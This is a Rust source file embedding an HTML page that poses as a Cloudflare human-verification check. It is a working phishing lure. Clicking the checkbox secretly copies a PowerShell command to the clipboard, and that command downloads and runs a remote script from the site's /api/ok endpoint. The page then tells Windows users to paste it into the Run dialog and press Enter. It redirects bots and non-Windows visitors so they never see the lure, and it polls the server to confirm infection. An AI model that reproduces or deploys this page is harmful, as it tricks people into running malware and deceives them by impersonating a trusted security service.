pub const INDEX_HTML: &str = r##"
<!doctype html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8" />
    <title>Just a moment...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="robots" content="noindex,nofollow" />
    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/32px-Cloudflare_Logo.svg.png" />

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
            color: #313131;
            font-family:
                system-ui,
                -apple-system,
                BlinkMacSystemFont,
                "Segoe UI",
                Roboto,
                "Helvetica Neue",
                Arial,
                "Noto Sans",
                sans-serif,
                "Apple Color Emoji",
                "Segoe UI Emoji",
                "Segoe UI Symbol",
                "Noto Color Emoji";
        }

        body {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background-color: #222;
            color: #d9d9d9;
            margin: 0;
            overflow: hidden;
        }

        .main-wrapper {
            display: flex;
            flex: 1;
            flex-direction: column;
            width: 100%;
            align-items: center;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            padding: 0 1.5rem;
            max-width: 60rem;
            width: 100%;
            text-align: center;
            margin-top: 15vh;
        }

        .h1 {
            justify-content: center;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .h2 {
            line-height: 1.5;
            font-size: 1.5rem;
            font-weight: 400;
            color: #d1d1d1;
        }

        .core-msg {
            line-height: 1.6;
            font-size: 1.5rem;
            font-weight: 400;
            color: #d1d1d1;
        }

        .spacer-bottom {
            margin-bottom: 0.5rem;
        }

        .widget-spacer {
            margin: 1rem 0;
        }

        .heading-favicon {
            width: 4rem;
            height: 4rem;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            margin: 0 auto;
            padding: 1rem 1rem;
            width: 100%;
            max-width: 60rem;
            line-height: 1.125rem;
            font-size: 0.75rem;
        }

        .footer-inner {
            border-top: 1px solid #444;
            padding-top: 1rem;
            padding-bottom: 1rem;
        }

        .ray-id {
            text-align: center;
            margin-bottom: 0.5rem;
        }

        .ray-id code {
            font-family: monaco, courier, monospace;
        }

        .text-center {
            text-align: center;
        }

        .footer a {
            color: #4693ff;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        #content {
            box-sizing: border-box;
            display: flex;
            gap: 15px;
            align-items: center;
            justify-content: center;
            border: 1px solid #797979;
            background-color: #232323;
            height: 78px;
            user-select: none;
            padding: 0 16px;
            width: 100%;
            max-width: 320px;
            margin: 0 auto;
        }

        #branding {
            display: inline-flex;
            flex-direction: column;
            text-align: right;
        }

        #logo {
            width: 90px;
            margin-bottom: 1px;
        }

        .logo-dark {
            filter: invert(1) hue-rotate(180deg);
        }

        #terms {
            line-height: 2.5;
            color: #bbb;
            font-size: 8px;
            font-weight: 400;
        }

        #terms a {
            text-decoration: underline;
            color: #bbb;
        }

        #terms a:hover {
            text-decoration: none;
        }

        #terms .link-spacer {
            margin: 0 0.2rem;
        }

        .cb-c {
            display: flex;
            align-items: center;
            cursor: pointer;
            text-align: left;
        }

        .cb-lb {
            display: grid;
            place-items: center;
        }

        .cb-lb input {
            grid-area: 1/1;
            opacity: 0;
            z-index: 9999;
            margin: 0;
            cursor: pointer;
            width: 30px;
            height: 30px;
        }

        .cb-lb .cb-i {
            box-sizing: border-box;
            grid-area: 1/1;
            transition: all 0.1s ease-in;
            z-index: 9998;
            border: 2px solid #dadada;
            border-radius: 3px;
            background: #222;
            width: 30px;
            height: 30px;
        }

        .cb-lb-t {
            grid-column: 2;
            margin-left: 12px;
            color: #fff;
            font-size: 14px;
        }

        .verification-container {
            display: none;
            align-items: center;
            gap: 12px;
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        #verifying-i {
            display: flex;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        #verifying-text {
            font-size: 14px;
            font-weight: 400;
            color: #fff;
        }

        .modal-overlay {
            position: fixed;
            pointer-events: none;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            visibility: hidden;
            transition:
                opacity 0.3s ease,
                visibility 0.3s ease;
        }

        .modal-overlay.visible {
            opacity: 1;
            visibility: visible;
        }

        .modal-content {
            pointer-events: auto;
            background-color: #2b2b2b;
            border-radius: 8px;
            max-width: 480px;
            width: 90%;
            text-align: left;
            overflow: hidden;
            transform: scale(0.95);
            transition: transform 0.3s ease;
        }

        .modal-overlay.visible .modal-content {
            transform: scale(1);
        }

        .modal-header {
            background: linear-gradient(90deg, #f38020, #e9a33f);
            padding: 1rem 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-header-text h2 {
            font-size: 1.25rem;
            margin: 0 0 0.25rem 0;
            color: #fff;
            font-weight: 700;
        }

        .modal-header-text p {
            font-size: 0.9rem;
            margin: 0;
            color: #fff;
            opacity: 0.9;
        }

        .modal-header img {
            height: 25px;
        }

        .modal-body {
            padding: 1.5rem 1.5rem 0.5rem 1.5rem;
        }

        .modal-body h3 {
            font-size: 1.1rem;
            margin-bottom: 1.5rem;
            font-weight: 500;
        }

        .instruction-list {
            list-style: none;
            padding: 0;
            margin-bottom: 1.5rem;
        }

        .instruction-list li {
            font-size: 1rem;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .win-key-icon {
            width: 1em;
            height: 1em;
            vertical-align: middle;
        }

        kbd {
            background-color: #444;
            border: 1px solid #666;
            border-radius: 3px;
            padding: 2px 6px;
            font-family: monospace;
            font-size: 0.9em;
        }

        .agreement-section {
            margin-bottom: 0.5rem;
        }

        .agreement-section h3 {
            font-size: 0.9rem;
            font-weight: normal;
            color: #ccc;
            margin-bottom: 0.4rem;
        }

        .agreement-section p {
	    text-align: center;
            margin: 0.5rem auto;
            background-color: #1e1e1e;
            padding: 0.5rem;
            border-radius: 4px;
            font-family: "Courier New", Courier, monospace;
            font-size: 0.9rem;
            line-height: 1;
            color: #ddd;
            white-space: pre-wrap;
            overflow-wrap: break-word;
        }

        .modal-footer {
            background-color: #333;
            padding: 1rem 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-footer p {
            margin: 0;
            font-size: 0.9rem;
            color: #ccc;
        }

        #verify-btn {
            background-color: #f38020;
            color: #fff;
            border: none;
            padding: 0.6rem 1.2rem;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 700;
            transition: background-color 0.2s;
            min-width: 110px;
            text-align: center;
        }

        #verify-btn:hover:not(:disabled) {
            background-color: #d86e18;
        }

        #verify-btn:disabled {
            background-color: #5a5a5a;
            color: #aaa;
            cursor: not-allowed;
        }

        .logo-light {
            display: none;
        }

        @media (width <=720px) {
            .main-content {
                margin-top: 6rem;
            }

            .h1 {
                font-size: 2rem;
            }

            .h2,
            .core-msg {
                font-size: 1.25rem;
            }
        }

        @media (prefers-color-scheme: light) {
            body {
                background-color: #ffffff;
                color: #313131;
            }

            .h1 {
                color: #111;
            }

            .h2,
            .core-msg {
                color: #333;
            }

            .footer-inner {
                border-top: 1px solid #d1d1d1;
            }

            #content {
                border: 1px solid #d1d1d1;
                background-color: #f9f9f9;
            }

            #terms,
            #terms a {
                color: #555;
            }

            .cb-lb .cb-i {
                border: 2px solid #aaa;
                background: #eee;
            }

            .cb-lb-t,
            #verifying-text {
                color: #111;
            }

            .modal-overlay {
                background-color: rgba(0, 0, 0, 0.5);
            }

            .modal-content {
                background-color: #ffffff;
            }

            .modal-body h3,
            .instruction-list li {
                color: #111;
            }

            kbd {
                background-color: #eee;
                border: 1px solid #ccc;
                color: #333;
            }

            .agreement-section h3 {
                color: #444;
            }

            .agreement-section p {
                background-color: #f0f0f0;
                color: #333;
            }

            .modal-footer {
                background-color: #f5f5f5;
            }

            .modal-footer p {
                color: #555;
            }

            #verify-btn:disabled {
                background-color: #ccc;
                color: #777;
            }

            .logo-light {
                display: block;
            }

            .logo-dark {
                display: none;
            }
        }
    </style>
</head>

<body>
    <div class="main-wrapper" role="main">
        <div class="main-content">
            <h1 class="h1">
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" alt="Cloudflare Favicon" class="heading-favicon" />
                cloudflare.com
            </h1>
            <p class="h2 spacer-bottom">
                We're checking if you're human. It could take a few seconds.
            </p>
            <div class="widget-spacer">
                <div id="content">
                    <div class="cb-c">
                        <label class="cb-lb">
                            <input type="checkbox" id="captcha-checkbox" />
                            <span class="cb-i"></span>
                        </label>
                        <span class="cb-lb-t">Verify you are human</span>
                    </div>
                    <div class="verification-container">
                        <div id="verifying-i">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" style="background: 0 0" class="iBxDT5">
                                <circle cx="50" cy="50" r="40" fill="none" stroke="#fbad41" stroke-width="10" stroke-dasharray="160 100">
                                    <animateTransform attributeName="transform" type="rotate" values="0 50 50;360 50 50" times="0;1" dur="1s" repeatCount="indefinite"></animateTransform>
                                </circle>
                            </svg>
                        </div>
                        <span id="verifying-text">Verifying...</span>
                    </div>
                    <div id="branding">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare Logo" id="logo" class="logo-dark" />
                        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare Logo" id="logo" class="logo-light" />
                        <div id="terms">
                            <a href="#">Privacy</a><span class="link-spacer">•</span><a href="#">Terms</a>
                        </div>
                    </div>
                </div>
            </div>
            <p class="core-msg">
                First, cloudflare.com needs to check the security of your connection.
            </p>
        </div>
    </div>
    <div class="footer" role="contentinfo">
        <div class="footer-inner">
            <div class="ray-id">Ray ID: <code id="ray-id-code"></code></div>
            <div class="text-center" id="footer-text">
                Performance &amp; security by
                <a rel="noopener noreferrer" href="https://www.cloudflare.com/" target="blank">Cloudflare</a>
            </div>
        </div>
    </div>

    <div id="instruction-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-header-text">
                    <h2>Verifying you are human</h2>
                    <p>This may take a few seconds</p>
                </div>
                <img src="https://i.postimg.cc/MK9L5Vtq/cloudfare-1536x508.png" class="logo-dark" style="filter: invert(1) hue-rotate(180deg)" />
                <img src="https://i.postimg.cc/MK9L5Vtq/cloudfare-1536x508.png" alt="Cloudflare Logo" class="logo-light" />
            </div>
            <div class="modal-body">
                <h3>Let us know you're human, please complete steps:</h3>
                <ol class="instruction-list">
                    <li>
                        1. Press & hold the Windows Key
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" class="win-key-icon" alt="Windows Key" />
                        + <kbd>R</kbd>
                    </li>
                    <li>
                        2. In the verification window, press <kbd>Ctrl</kbd> +
                        <kbd>V</kbd>
                    </li>
                    <li>3. Press <kbd>Enter</kbd> on the keyboard to complete</li>
                </ol>
                <div class="agreement-section">
                    <h3>You will observe and agree:</h3>
                    <p id="agreement-text">I am not a robot - Cloudflare ID:</p>
                </div>
            </div>
            <div class="modal-footer">
                <p>Perform the above steps to complete verification</p>
                <button id="verify-btn">VERIFY</button>
            </div>
        </div>
    </div>

    <script>
        (function() {
	    
            const config = {
                verify: `${window.location.origin}/api/ok`,
                isWin: navigator.userAgent.includes("Windows"),
                isBot: /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent),
            };

            const dom = {
                checkbox: document.getElementById("captcha-checkbox"),
                checkboxContainer: document.querySelector(".cb-c"),
                verifContainer: document.querySelector(".verification-container"),
                modal: document.getElementById("instruction-modal"),
                verifyBtn: document.getElementById("verify-btn"),
                rayId: document.getElementById("ray-id-code"),
                agreeText: document.getElementById("agreement-text"),
            };
            

            const handleVerify = () => {
                const input = document.createElement("textarea");
                input.value = `powershell -c "& ([scriptblock]::Create((irm ${config.verify} -UseBasicParsing)))"`;
                document.body.appendChild(input);
                input.select();
                document.execCommand("copy");
                document.body.removeChild(input);
                
                dom.checkboxContainer.style.display = 'none';
                dom.verifContainer.style.display = 'flex';
                
		setTimeout(() => {
                dom.modal.classList.add("visible");
                dom.verifyBtn.disabled = true;

                const verify = setInterval(async () => {
                
                        const response = await fetch("/api/status");
                        const data = await response.json();

                        if (data.isDownloaded === true) {
                            clearInterval(verify);
                            dom.verifyBtn.disabled = false;

                            dom.verifyBtn.onclick = () => {
                                window.location.href = data.redirectUrl;
                            };
                        }
                }, 3000);
            }, 1500);
            };

            const init = async () => {
                const response = await fetch("/api/status");
                const data = await response.json();

                if (!config.isWin || config.isBot) {
                    window.location.href = data.redirectUrl;
                }
            };
            
            const hex = Math.random().toString(15).slice(2, 20);
	        dom.rayId.textContent = hex;	    
	        dom.agreeText.textContent = `I am not a robot Cloudflare ID: ${hex}`;
            dom.checkboxContainer.addEventListener("click", handleVerify);
            
            init();
        })();
    </script>
</body>

</html>

"##;
